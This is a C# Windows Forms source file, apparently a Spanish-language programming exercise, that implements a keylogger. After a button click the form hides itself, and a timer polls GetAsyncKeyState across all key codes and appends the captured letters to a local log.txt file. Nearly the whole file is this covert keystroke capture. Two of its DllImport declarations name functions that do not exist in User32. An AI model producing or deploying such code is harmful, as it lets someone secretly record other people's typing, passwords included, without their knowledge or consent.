﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Ejericicio19
{
    


    public partial class Form1 : Form
    {
        private StreamWriter flujoSalida;

        private string letra = "";

        [DllImport("User32.dll")]

        private static extern short
            GetAsyncKeyState(Keys teclas);

        [DllImport("User32.dll")]

        private static extern short
           GetAsyncKeyState(Int32 teclas);

        [DllImport("User32.dll")]

        private static extern short
           GetKeycKeyState(Keys teclas);

        [DllImport("User32.dll")]

        private static extern short
           GetKeyncKeyState(Int32 teclas);


        public Form1()
        {
            InitializeComponent();
            flujoSalida = File.AppendText("log.txt") ;//Se genera en la capeta BIN
            flujoSalida.Write("\r\nInicio\r\n");
            flujoSalida.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //Clase que esa mandando a ejecutar eso (el Form)
            //Va a minimizar el form
            //this.Size = new Size(0, 0);
            this.Visible = false;
            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            for (int num = 1; num <= 255; num++)
            {
                int numcontrol = GetAsyncKeyState(num);
                
                if (numcontrol==-32767)
                {
                    Console.WriteLine(num+"");
                    if (num==13)
                    {
                        //Si presiono 13 

                        EscribirLog("\r\n");
                    }

                    if(num>=65&&num<=122)
                    {
                        if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey))
                            && Convert.ToBoolean(GetAsyncKeyState(Keys.CapsLock)))
                        {
                            letra = Convert.ToChar(num+32).ToString();
                            EscribirLog(letra);
                        }

                        else
                        {
                            if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)))
                            {
                                //Escribe la maúscula
                                letra = Convert.ToChar(num).ToString();
                                EscribirLog(letra);
                            }

                            else

                            if (Convert.ToBoolean(GetAsyncKeyState(Keys.CapsLock)))
                            {
                                //Escribe la maúscula
                                letra = Convert.ToChar(num).ToString();
                                EscribirLog(letra);
                            }

                            else
                            {
                                letra = Convert.ToChar(num+32).ToString();
                                EscribirLog(letra);

                            }
                        }
                    }
                }

            }
        }

        private void EscribirLog(string letra)
        {
            try
            {
                flujoSalida = File.AppendText("log.txt");
                flujoSalida.Write(letra);
                flujoSalida.Close();
            }

            catch
            {

            }
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            timer1.Stop();
        }
    }
}
